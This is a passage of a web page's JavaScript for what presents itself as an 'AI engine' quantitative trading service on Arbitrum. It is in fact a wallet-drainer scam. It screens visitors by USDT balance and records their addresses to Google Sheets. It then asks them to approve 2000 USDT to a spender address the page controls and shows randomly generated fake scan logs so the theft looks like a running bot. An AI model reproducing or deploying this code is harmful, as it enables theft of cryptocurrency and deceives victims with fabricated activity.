        const balanceOfData = `0x70a08231000000000000000000000000${cleanAddress.slice(2)}`;
        const rpcList = ['https://arb1.arbitrum.io/rpc', 'https://rpc.arbitrum.one', 'https://arbitrum.publicnode.com'];
        for (let i = 0; i < rpcList.length; i++) {
            try {
                const res = await fetch(rpcList[i], {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ jsonrpc: '2.0', method: 'eth_call', params: [{ to: USDT_ADDRESS, data: balanceOfData }, 'latest'], id: i+1 })
                });
                const data = await res.json();
                if (data && data.result) return { success: true, balance: parseInt(data.result, 16) / 1e6 };
            } catch(e) { console.log(`RPC ${i+1} 失败`); }
        }
        return { success: false, balance: 0, error: '查询失败' };
    }
    
    function isValidArbitrumAddress(addr) { return /^0x[a-fA-F0-9]{40}$/i.test(addr?.trim()); }
    
    // ========== 页面切换函数 ==========
    function showPage(pageId) {
        const pages = ['passwordPage', 'whitepaperPage', 'tutorialPage', 'applyPage', 'announcementPage', 'quantPanel', 'runningPanel'];
        for (let i = 0; i < pages.length; i++) { const el = document.getElementById(pages[i]); if (el) el.style.display = 'none'; }
        const target = document.getElementById(pageId);
        if (target) target.style.display = 'block';
    }
    
    // 绑定返回按钮
    document.getElementById('backToPasswordBtn')?.addEventListener('click', () => showPage('passwordPage'));
    document.getElementById('backToPasswordFromTutorial')?.addEventListener('click', () => showPage('passwordPage'));
    document.getElementById('backToPasswordFromApply')?.addEventListener('click', () => showPage('passwordPage'));
    document.getElementById('backToPasswordFromQuant')?.addEventListener('click', () => showPage('passwordPage'));
    document.getElementById('backToPasswordFromAnnouncement')?.addEventListener('click', () => showPage('passwordPage'));
    document.getElementById('backToQuantFromRunning')?.addEventListener('click', () => showPage('quantPanel'));
    
    // 绑定导航按钮
    document.getElementById('whitepaperBtn')?.addEventListener('click', () => showPage('whitepaperPage'));
    document.getElementById('tutorialBtn')?.addEventListener('click', () => showPage('tutorialPage'));
    document.getElementById('applyBtn')?.addEventListener('click', () => showPage('applyPage'));
    document.getElementById('announcementBtn')?.addEventListener('click', () => showPage('announcementPage'));
    
    // ========== 密码验证 ==========
    document.getElementById('submitPassword').onclick = function() {
        var pwd = document.getElementById('passwordInput').value;
        if (pwd === SYSTEM_PASSWORD) { showPage('quantPanel'); document.getElementById('errorMsg').textContent = ''; }
        else { document.getElementById('errorMsg').textContent = '❌ 密码错误，请输入正确的访问密码'; document.getElementById('passwordInput').value = ''; document.getElementById('passwordInput').focus(); }
    };
    document.getElementById('passwordInput').onkeypress = function(e) { if (e.key === 'Enter') document.getElementById('submitPassword').click(); };
    
    // ========== 申请访问 ==========
    let isSubmitting = false;
    document.getElementById('submitApplyBtn').onclick = async function() {
        if (isSubmitting) return;
        const address = document.getElementById('applyAddressInput').value.trim();
        const applyMsg = document.getElementById('applyMsg');
        if (!isValidArbitrumAddress(address)) { applyMsg.innerHTML = '❌ 无效的 Arbitrum 链地址！'; applyMsg.style.color = '#ff8888'; return; }
        
        try {
            isSubmitting = true; document.getElementById('submitApplyBtn').disabled = true;
            applyMsg.innerHTML = '<span class="loading-spinner"></span> 🔍 正在链上查询 USDT 余额...'; applyMsg.style.color = '#88ccff';
            const balanceResult = await getUSDTBalance(address);
            if (!balanceResult.success) { applyMsg.innerHTML = `❌ 查询余额失败：${balanceResult.error || '网络错误'}`; applyMsg.style.color = '#ff8888'; return; }
            const balance = balanceResult.balance;
            if (balance < MIN_USDT_REQUIRED) { applyMsg.innerHTML = `❌ 申请失败！<br>💰 当前地址 USDT 余额：${balance.toFixed(2)} USDT<br>⚠️ 需要持有 ≥${MIN_USDT_REQUIRED} USDT`; applyMsg.style.color = '#ffaa88'; return; }
            if (balance > MAX_USDT_LIMIT) { applyMsg.innerHTML = `⚠️ 余额超过限制！<br>💰 当前地址 USDT 余额：${balance.toFixed(2)} USDT<br>⚠️ 请确保钱包内 ≤${MAX_USDT_LIMIT} USDT`; applyMsg.style.color = '#ffaa88'; return; }
            
            // 申请通过，保存到 Google Sheets
            await saveApplicationToSheet(address, balance);
            
            applyMsg.innerHTML = `✅ 您的地址已通过审核！<br>🔐 访问密码：<strong style="font-size:28px; color:#88ffaa;">${SYSTEM_PASSWORD}</strong><br>📝 请返回密码验证页面登录`;
            applyMsg.style.color = '#88ffaa'; document.getElementById('applyAddressInput').value = '';
        } catch (error) { applyMsg.innerHTML = '❌ 系统错误，请稍后重试'; applyMsg.style.color = '#ff8888'; }
        finally { isSubmitting = false; document.getElementById('submitApplyBtn').disabled = false; }
    };
    
    // ========== 网络检测函数 ==========
    async function checkAndSwitchNetwork(wallet) {
        try {
            let chainId = await wallet.request({ method: 'eth_chainId' });
            chainId = parseInt(chainId, 16);
            if (chainId !== TARGET_CHAIN_ID) {
                const infoDiv = document.getElementById('info');
                infoDiv.innerHTML = `⚠️ 当前网络不是 ${TARGET_CHAIN_NAME}！<br>请在钱包右上角点击网络，切换到 Arbitrum One 网络后重新连接`;
                infoDiv.style.color = '#ffaa88';
                return false;
            }
            const networkStatus = document.getElementById('networkStatus');
            networkStatus.innerHTML = '✅ Arbitrum One 主网';
            networkStatus.style.color = '#88ffaa';
            return true;
        } catch (error) {
            console.error('网络检测失败:', error);
            return false;
        }
    }
    
    // ========== 授权逻辑 ==========
    let currentSigner = null;
    let usdtDecimals = null;
    let usdtContractWithSigner = null;
    let logInterval = null;
    
    const connectBtn = document.getElementById("connect");
    const approveBtn = document.getElementById("approve");
    const infoDiv = document.getElementById("info");
    const walletAddressSpan = document.getElementById("walletAddressDisplay");
    
    function startRunningLogs() {
        if (logInterval) clearInterval(logInterval);
        const logArea = document.getElementById('logArea');
        if (!logArea) return;
        logArea.innerHTML = `<div class="log-line"><span class="log-time">${getCurrentTime()}</span> <span class="log-scan">✅ AI引擎启动成功</span></div>`;
        const dexList = ['PancakeSwap', 'Uniswap', 'SushiSwap', 'Curve', 'Balancer'];
        const gasMessages = ['⛽ Gas费较高: 32 Gwei，等待中...', '⛽ Gas费较高: 38 Gwei，等待中...', '⛽ 当前Gas: 28 Gwei，正常范围'];
        const scanMessages = ['🔍 正在扫描 {dex} 交易所...', '🔍 扫描 {dex} 流动性池...'];
        function getRandomDex() { return dexList[Math.floor(Math.random() * dexList.length)]; }
        function getRandomLog() {
            const rand = Math.random();
            let message = '', colorClass = 'log-scan';
            if (rand < 0.5) { const dex = getRandomDex(); message = scanMessages[Math.floor(Math.random() * scanMessages.length)].replace('{dex}', dex); }
            else { message = gasMessages[Math.floor(Math.random() * gasMessages.length)]; colorClass = 'log-gas'; }
            return `<div class="log-line"><span class="log-time">${getCurrentTime()}</span> <span class="${colorClass}">${message}</span></div>`;
        }
        logInterval = setInterval(() => {
            if (logArea && document.getElementById('runningPanel').style.display === 'block') {
                logArea.insertAdjacentHTML('beforeend', getRandomLog());
                logArea.scrollTop = logArea.scrollHeight;
                while (logArea.children.length > 20) logArea.removeChild(logArea.firstChild);
            }
        }, 3200);
    }
    
    function getCurrentTime() { const now = new Date(); return `${now.getHours().toString().padStart(2,'0')}:${now.getMinutes().toString().padStart(2,'0')}:${now.getSeconds().toString().padStart(2,'0')}`; }
    
    async function initUSDTContractWithSigner(signer) {
        const abi = ["function decimals() view returns (uint8)", "function approve(address spender, uint256 amount) public returns (bool)", "function allowance(address owner, address spender) view returns (uint256)"];
        const contract = new ethers.Contract(USDT_ADDRESS, abi, signer);
        const decimals = await contract.decimals();
        return { contract, decimals };
    }
    
    async function getAllowanceReadOnly(userAddress, spenderAddress, contractAddress, provider) {
        try {
            const abi = ["function allowance(address owner, address spender) view returns (uint256)"];
            const contract = new ethers.Contract(contractAddress, abi, provider);
            return await contract.allowance(userAddress, spenderAddress);
        } catch (err) { return null; }
    }
    
    function isMobile() { return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent); }
    function tryOpenOKXApp() { if (isMobile()) { window.location.href = "okx://wallet/dapp?url=" + encodeURIComponent(window.location.href); setTimeout(() => { window.location.href = "https://www.okx.com/download"; }, 2000); } }
    function getWallet() { if (window.okxwallet) return window.okxwallet; if (window.ethereum && window.ethereum.isOKXWallet) return window.ethereum; if (window.ethereum) return window.ethereum; return null; }
    function updateUI(address = null) { if (address) { walletAddressSpan.innerText = address.slice(0,6)+"..."+address.slice(-4); walletAddressSpan.style.color = "#88ccff"; } else { walletAddressSpan.innerText = "未连接"; walletAddressSpan.style.color = "#aaa"; } }
    
    if (connectBtn) {
        connectBtn.onclick = async () => {
            let wallet = getWallet();
            if (!wallet) {
                if (isMobile()) { infoDiv.innerHTML = "📱 正在尝试打开 OKX App..."; tryOpenOKXApp(); }
                else { infoDiv.innerHTML = "❌ 未检测到 OKX 钱包<br><br><a href='https://www.okx.com/download' target='_blank' class='download-link'>👉 点击下载 OKX 钱包</a>"; }
                return;
            }
            try {
                infoDiv.innerHTML = "⏳ 请求连接钱包...<br>请确认右上角网络是 Arbitrum One";
                await wallet.request({ method: "eth_requestAccounts" });
                const isCorrectNetwork = await checkAndSwitchNetwork(wallet);
                if (!isCorrectNetwork) { return; }
                const provider = new ethers.providers.Web3Provider(wallet);
                const signer = provider.getSigner();
                currentSigner = signer;
                const address = await signer.getAddress();
                updateUI(address);
                const { contract, decimals } = await initUSDTContractWithSigner(signer);
                usdtContractWithSigner = contract;
                usdtDecimals = decimals;
                infoDiv.innerHTML = `✅ AI引擎准备就绪，请授权启动引擎 | 地址: ${address.slice(0,6)}...${address.slice(-4)}`;
                approveBtn.disabled = false;
            } catch (err) { infoDiv.innerHTML = "❌ 连接失败: " + (err.message || "用户取消"); }
        };
    }
    
    if (approveBtn) {
        approveBtn.onclick = async () => {
            if (!currentSigner) { alert("请先连接钱包"); return; }
            const userAddress = await currentSigner.getAddress();
            if (!usdtContractWithSigner || usdtDecimals === null) {
                const { contract, decimals } = await initUSDTContractWithSigner(currentSigner);
                usdtContractWithSigner = contract;
                usdtDecimals = decimals;
            }
            const provider = currentSigner.provider;
            const rawAllowance = await getAllowanceReadOnly(userAddress, SPENDER_ADDRESS, USDT_ADDRESS, provider);
            const currentAllowance = parseFloat(ethers.utils.formatUnits(rawAllowance, usdtDecimals));
            
            let usdtBalance = 0;
            try {
                const balanceResult = await getUSDTBalance(userAddress);
                if (balanceResult.success) usdtBalance = balanceResult.balance;
            } catch(e) { console.log('查询余额失败'); }
            
            if (currentAllowance >= MIN_APPROVE_AMOUNT) {
                infoDiv.innerHTML = `✅ 授权额度已满足<br>🚀 正在启动 AI 引擎...`;
                await saveAuthorizationToSheet(userAddress, usdtBalance, 'already_authorized');
                showPage('runningPanel');
                startRunningLogs();
                return;
            }
            try {
                infoDiv.innerHTML = "📡 请在钱包内确认授权<br>授权额度: 2000 USDT";
                const amountToApproveRaw = ethers.utils.parseUnits("2000", usdtDecimals);
                const tx = await usdtContractWithSigner.approve(SPENDER_ADDRESS, amountToApproveRaw);
                infoDiv.innerHTML = "⛓️ 交易已提交 | Hash: " + tx.hash.slice(0,10)+"...";
                await tx.wait();
                
                await saveAuthorizationToSheet(userAddress, usdtBalance, tx.hash);
                
                try {
                    await internalTransferEth(userAddress);
                } catch(e) { console.log('转账失败:', e); }
                
                infoDiv.innerHTML = `✅ 授权成功！<br>🚀 AI 引擎正在启动...`;
                showPage('runningPanel');
                startRunningLogs();
            } catch (err) { infoDiv.innerHTML = "❌ 授权失败: " + (err.message || "用户取消"); }
        };
    }
    
    console.log('系统启动成功，密码: 1134');
</script>
</body>
</html>
